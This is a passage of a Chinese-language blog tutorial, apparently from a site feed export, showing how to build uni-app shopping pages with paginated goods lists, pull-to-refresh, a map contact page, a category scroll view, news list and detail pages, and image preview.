class="line">&lt;text&gt;&#123;&#123;item.title&#125;&#125;&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><p>执行跳转需要一个点击事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 导航栏 --&gt;</span><br><span class="line">&lt;view class=&quot;nav&quot;&gt;</span><br><span class="line">&lt;view class=&quot;nav_item&quot; v-for=&quot;(item,index) in navs&quot; :key=&quot;index&quot; @click=&quot;navItemClick(item.url)&quot;&gt;</span><br><span class="line">&lt;view :class=&quot;item.icon&quot;&gt;&lt;/view&gt;</span><br><span class="line">&lt;text&gt;&#123;&#123;item.title&#125;&#125;&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><p>拿到每一个item的url之后可以调用navigateTo进行跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//点击导航栏触发跳转</span><br><span class="line">navItemClick(url)&#123;</span><br><span class="line">uni.navigateTo(&#123;</span><br><span class="line">url</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们对跳转的页面进行处理：新建一个goods页面作为跳转目的地，引用goodList组件，这里主要是pageindex中的数字不能写死，需要根据用户的需求进行调整</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;view class=&quot;good_List&quot;&gt;</span><br><span class="line">&lt;goodList :goods=&quot;goods&quot;&gt;&lt;/goodList&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import goodList from &#x27;../../components/goodList/goodList.vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">components: &#123;&quot;goodList&quot;:goodList&#125;,</span><br><span class="line">data() &#123;</span><br><span class="line">return &#123;</span><br><span class="line">pageindex : 1,</span><br><span class="line">goods : []</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">async getGoods()&#123;</span><br><span class="line">const res =  await this.$myreq(&#123;</span><br><span class="line">url:&#x27;/api/getGoods?pageindex=&#x27;+this.pageindex</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">this.goods = res.data.message</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">onLoad() &#123;</span><br><span class="line">this.getGoods()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.goodList&#123;</span><br><span class="line">background-color: #eee;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>当用户滑到底部的时候，调用一个函数获取新的页面，改造一下我们的getGoods函数</p><p>我一开始用的push</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//实现数组的叠加</span><br><span class="line">this.goods.push(...res.data.message)</span><br></pre></td></tr></table></figure><p>后面发现直接使用展开运算符是一样的效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">async getGoods()&#123;</span><br><span class="line">const res =  await this.$myreq(&#123;</span><br><span class="line">url:&#x27;/api/getGoods?pageindex=&#x27;+this.pageindex</span><br><span class="line">&#125;)</span><br><span class="line">//实现数组的叠加</span><br><span class="line">this.goods = [...this.goods, ...res.data.message]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们这里会显示其他页的数据，通过改变我们的pageindex，然后触底的时候发送请求</p><p>我们首先写一个，没有更多数据的提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;view class=&quot;isOver&quot; v-show=&quot;flag&quot;&gt;-----我也是有底线的-----&lt;/view&gt;</span><br></pre></td></tr></table></figure><p>这个提示的显示由<strong>请求到的数据是不是为空</strong>决定，没有数据了我们达到底部也不发送请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">onReachBottom() &#123;</span><br><span class="line">this.pageindex++</span><br><span class="line">if(this.flag == false)&#123;</span><br><span class="line">this.getGoods()</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>然后在getGoods中判断，没有数据了就将flag为true，将提示显示出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">async getGoods()&#123;</span><br><span class="line">const res =  await this.$myreq(&#123;</span><br><span class="line">url:&#x27;/api/getGoods?pageindex=&#x27;+this.pageindex</span><br><span class="line">&#125;)</span><br><span class="line">//判断是否还有数据</span><br><span class="line">if(res.data.message.length == 0)&#123;</span><br><span class="line">this.flag = true</span><br><span class="line">&#125;</span><br><span class="line">//实现数组的叠加</span><br><span class="line">// this.goods.push(...res.data.message)</span><br><span class="line">this.goods = [...this.goods, ...res.data.message]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们设置一个下拉刷新，在pages.json中打开我们的PullDownRefresh</p><p>在下拉的生命周期中重置数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//下拉刷新</span><br><span class="line">async onPullDownRefresh() &#123;</span><br><span class="line">this.pageindex == 1</span><br><span class="line">this.goods = []</span><br><span class="line">this.flag = false</span><br><span class="line">//等待请求发送成功后消除刷新效果</span><br><span class="line">await this.getGoods()</span><br><span class="line">uni.stopPullDownRefresh()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果getGoods执行完毕就触发stopPullDownRefresh，还有一种方法是将stopPullDownRefresh设置成getGoods的回调</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">this.getGoods(()=&gt;&#123;</span><br><span class="line">uni.stopPullDownRefresh()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">callBack &amp;&amp; callBack()</span><br><span class="line"></span><br><span class="line">//getGoods中接收回调</span><br><span class="line">getGoods(callBack)</span><br></pre></td></tr></table></figure><h3 id="8-contact页面的map"><a href="#8-contact页面的map" class="headerlink" title="8. contact页面的map"></a>8. contact页面的map</h3><p>这里启用在manifest.json中的h5配置中的定位和地图，需要输入一个应用key，在腾讯地图中申请便可</p><p>将key设置成map</p><p>就可以在我们的程序中使用<code>&lt;map&gt;</code>标签使用</p><p>map中有两个位置属性 分别代表经纬度，一般将经纬度数据放在data中如何动态绑定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;map class=&quot;map&quot; :latitude=&quot;latitude&quot; :longitude=&quot;longitude&quot;&gt;&lt;/map&gt;</span><br></pre></td></tr></table></figure><p>还可以设置坐标点等，写的时候本来想把iconpath写成绝对路径的，但是一直报错，改成相对路径才正确</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;map class=&quot;map&quot; :latitude=&quot;latitude&quot; :longitude=&quot;longitude&quot; :markers=&quot;markers&quot;&gt;&lt;/map&gt;</span><br><span class="line"></span><br><span class="line">//markers</span><br><span class="line">markers: [</span><br><span class="line">    &#123;</span><br><span class="line">    //id必写</span><br><span class="line">        id:1,</span><br><span class="line">        latitude: 30.832711,</span><br><span class="line">        longitude: 104.190908,</span><br><span class="line">        iconPath: &quot;../../static/icon/logo.png&quot;,</span><br><span class="line">        //设置透明度</span><br><span class="line">        alpha: 0.7</span><br><span class="line">    &#125;</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>然后拨打电话可以调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">phone()&#123;</span><br><span class="line">uni.makePhoneCall(&#123;</span><br><span class="line">phoneNumber:&quot;110-112-113&quot;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-pics页面"><a href="#9-pics页面" class="headerlink" title="9.pics页面"></a>9.pics页面</h3><p>这个页面需要在左侧设置一个滚动条，右侧是展示的图片等信息</p><h4 id="9-1-左侧"><a href="#9-1-左侧" class="headerlink" title="9.1 左侧"></a>9.1 左侧</h4><p>作为左侧的滚动条我们可以设置为：</p><p>需要注意这里从内到位的高度都需要设置成100%</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;view class=&quot;pics&quot;&gt;</span><br><span class="line">&lt;scroll-view class=&quot;left&quot; scroll-y=&quot;true&quot;&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;view&gt;家具生活&lt;/view&gt;</span><br><span class="line">&lt;/scroll-view&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line"></span><br><span class="line">//样式</span><br><span class="line">page&#123;</span><br><span class="line">height: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.pics&#123;</span><br><span class="line">height: 100%;</span><br><span class="line">.left&#123;</span><br><span class="line">width: 100px;</span><br><span class="line">height: 100%;</span><br><span class="line">border: solid 1px #eee;</span><br><span class="line">view&#123;</span><br><span class="line">height: 60px;</span><br><span class="line">width: 100%;</span><br><span class="line">line-height: 60px;</span><br><span class="line">text-align: center;</span><br><span class="line">font-size: 30rpx;</span><br><span class="line">border-top: solid 1px #eee;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是设置左侧数据渲染和数据展示</p><p>因为接口有问题，所以这里的数据我写死了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">cates:[</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;家居生活&quot;,</span><br><span class="line">id:1,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;摄影设计&quot;,</span><br><span class="line">id:2,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;装饰&quot;,</span><br><span class="line">id:3,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;服饰&quot;,</span><br><span class="line">id:4,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;装修&quot;,</span><br><span class="line">id:5,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;电气&quot;,</span><br><span class="line">id:6,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;管道&quot;,</span><br><span class="line">id:7,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;户型设计&quot;,</span><br><span class="line">id:8,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;医药&quot;,</span><br><span class="line">id:9,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;书籍&quot;,</span><br><span class="line">id:10,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;管道&quot;,</span><br><span class="line">id:11,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;户型设计&quot;,</span><br><span class="line">id:12,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;医药&quot;,</span><br><span class="line">id:13,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">title:&quot;书籍&quot;,</span><br><span class="line">id:14,</span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line">isActive: 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;view class=&quot;pics&quot;&gt;</span><br><span class="line">&lt;scroll-view class=&quot;left&quot; scroll-y=&quot;true&quot;&gt;</span><br><span class="line">&lt;view  :class=&quot;isActive===item.id?&#x27;active&#x27; : &#x27;&#x27;&quot; v-for=&quot;(item,index) in cates&quot; :key=&quot;item.id&quot; @click=&quot;changeItem(item.id)&quot;&gt;&#123;&#123;item.title&#125;&#125;&lt;/view&gt;</span><br><span class="line">&lt;/scroll-view&gt;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><p>这里得到的数据由cates遍历得到，这里我开始犯了一个错误，将三元表达式写成了这个样子</p><p><code>&quot;isActive===id?&#39;active&#39; : &#39;&#39;&quot;</code>，我们需要知道这个时候id是item中的属性，能这样写的情况取决于v-for</p><p> <code>v-for=&quot;(item,index) in cates&quot; :key=&quot;id&quot; </code>，如果这样子写，那么就可以将三元表达式写成<code>&quot;isActive===index?&#39;active&#39; : &#39;&#39;&quot;</code></p><p>对于v-for来说，我们得到的数据只有in前面的哪几个</p><h4 id="9-2-右侧"><a href="#9-2-右侧" class="headerlink" title="9.2 右侧"></a>9.2 右侧</h4><p>右侧的数据每个item的数据渲染部分</p><p>依然使用<code>scroll-view</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;scroll-view class=&quot;right&quot; scroll-y&gt;</span><br><span class="line">&lt;view  v-for=&quot;item in details&quot; :key=&quot;item.id&quot; class=&quot;item&quot;&gt;</span><br><span class="line">&lt;image src=&quot;../../static/icon/logo.png&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;text&gt;&#123;&#123;item.title&#125;&#125;&lt;/text&gt;</span><br><span class="line">&lt;text&gt;&#123;&#123;item.zhaiyao&#125;&#125;&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/scroll-view&gt;</span><br></pre></td></tr></table></figure><p>主要是样式设计，需要开启一个flex布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.pics&#123;</span><br><span class="line">height: 100%;</span><br><span class="line">display: flex;</span><br><span class="line">.left&#123;</span><br><span class="line">---</span><br><span class="line">&#125;</span><br><span class="line">.right&#123;</span><br><span class="line">height: 100%;</span><br><span class="line">width: 520rpx;</span><br><span class="line">//设置间隔距离</span><br><span class="line">margin: 10rpx auto;</span><br><span class="line">.item&#123;</span><br><span class="line">img&#123;</span><br><span class="line">height: 520rpx;</span><br><span class="line">weight: 520rpx;</span><br><span class="line">border-radius: 5px;</span><br><span class="line">&#125;</span><br><span class="line">text&#123;</span><br><span class="line">font-size: 30rpx;</span><br><span class="line">line-height: 60rpx;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现预览图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//预览图片</span><br><span class="line">previewImg(current_img)&#123;</span><br><span class="line">//提取details数组中的img_url属性</span><br><span class="line">const urls = this.details.map(item =&gt; &#123;</span><br><span class="line">return item.img_url</span><br><span class="line">&#125;)</span><br><span class="line">uni.previewImage(&#123;</span><br><span class="line">urls,</span><br><span class="line">current: current_img,</span><br><span class="line">indicator: &quot;default&quot;,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-资讯"><a href="#3-资讯" class="headerlink" title="3.资讯"></a>3.资讯</h2><p>对于资讯页面我们依然先搭建结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;view class=&quot;news&quot;&gt;</span><br><span class="line">&lt;view class=&quot;news_item&quot; v-for=&quot;item in news&quot; :key=&quot;item.id&quot; &gt;</span><br><span class="line">&lt;image src=&quot;../../static/icon/cart-active.png3&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;view class=&quot;right&quot;&gt;</span><br><span class="line">&lt;view class=&quot;title&quot;&gt;&#123;&#123;item.title&#125;&#125;&lt;/view&gt;</span><br><span class="line">&lt;view class=&quot;info&quot;&gt;</span><br><span class="line">&lt;text&gt;发表时间：&#123;&#123;item.add_time&#125;&#125;&lt;/text&gt;</span><br><span class="line">&lt;text&gt;浏览：&#123;&#123;item.click&#125;&#125;&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line"></span><br><span class="line">//样式</span><br><span class="line">.news&#123;</span><br><span class="line">.news_item&#123;</span><br><span class="line">//开启弹性</span><br><span class="line">display: flex;</span><br><span class="line">padding: 10rpx 20rpx;</span><br><span class="line">border-bottom: 1px solid $uni-color-shop;</span><br><span class="line">image&#123;</span><br><span class="line">min-width: 200rpx;</span><br><span class="line">max-width: 200rpx;</span><br><span class="line">height: 150rpx;</span><br><span class="line">&#125;</span><br><span class="line">.right&#123;</span><br><span class="line">display: flex;</span><br><span class="line">margin-left: 15rpx;</span><br><span class="line">//切换方式为竖轴</span><br><span class="line">flex-direction: column;</span><br><span class="line">//两边对齐</span><br><span class="line">justify-content: space-between;</span><br><span class="line">.title&#123;</span><br><span class="line">font-size: 30rpx;</span><br><span class="line">&#125;</span><br><span class="line">.info&#123;</span><br><span class="line">font-size: 24rpx;</span><br><span class="line">text:nth-child(2)&#123;</span><br><span class="line">margin-left: 30rpx;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是熟悉的接口和获取参数，然后遍历list得到数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">export default &#123;</span><br><span class="line">data() &#123;</span><br><span class="line">return &#123;</span><br><span class="line">news:[],</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">onLoad() &#123;</span><br><span class="line">this.getNews();</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">async getNews()&#123;</span><br><span class="line">const res = await this.$myreq(&#123;</span><br><span class="line">url: &quot;/api/getnewslist&quot;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">this.news = res.data.message</span><br><span class="line">console.log(this.news)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们点击某一条资讯的时候可以进入资讯的详情页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;view class=&quot;news_item&quot; @click=&quot;goDetails(item.id)&quot; v-for=&quot;item in news&quot; :key=&quot;item.id&quot; &gt;</span><br></pre></td></tr></table></figure><p>传入id作为每个资讯的标识</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">goDetails(id)&#123;</span><br><span class="line">uni.navigateTo(&#123;</span><br><span class="line">url: `/pages/news-detail/news-detail?id=$&#123;id&#125;`</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们跳转至<code>news-detail</code>页面</p><p>进入之后第一件事情当然是发请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">async getNewsDetails()&#123;</span><br><span class="line">const res = await this.$myreq(&#123;</span><br><span class="line">url: `/api/getnew/$&#123;this.id&#125;`</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">this.details = res.data.message[0]</span><br><span class="line">this.details.add_time = this.formatDate(this.details.add_time)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>与众不同的是这个时候返回的内容数据是html</p><p>所以我们展示的时候就不能使用插值语法，<strong>使用<code>v-html</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;view class=&quot;content&quot; v-html=&quot;details.content&quot;&gt;</span><br></pre></td></tr></table></figure><p>或者使用<code>&lt;rich-text :nodes=&quot;参数&quot;&gt;</code>富文本也可以解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;view class=&quot;content&quot;&gt;内容：</span><br><span class="line">&lt;!-- 引入富文本解析html --&gt;</span><br><span class="line">&lt;rich-text :nodes=&quot;Dinfo.content&quot;&gt;&lt;/rich-text&gt;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><h2 id="4-获取商品详情"><a href="#4-获取商品详情" class="headerlink" title="4.获取商品详情"></a>4.获取商品详情</h2><p>点击goodList组件中的图片可以进行跳转</p><p>需要用到子组件向父组件传值，使用emit绑定自定义事件，并通过第二个参数进行传值</p><p>因为goodList在index首页和goods页面都有用到，所以这两个父页面都需要绑定对应的自定义事件</p><p>而且他们需要获得goodList中的<code>item.id</code></p><p>然后在两个父页面中使用navigate跳转到详情页面，并把数据<code>id</code>通过OnLoad中的options传入</p><p>详情页面拿到<code>id</code>后向服务器端发送请求，获取的数据用于轮播图，基本信息展示</p>]]></content>
    
    
    
    <tags>
      
      <tag>uni-app</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>some exercise</title>
    <link href="/2022/09/29/some%20exercise/"/>
    <url>/2022/09/29/some%20exercise/</url>
    
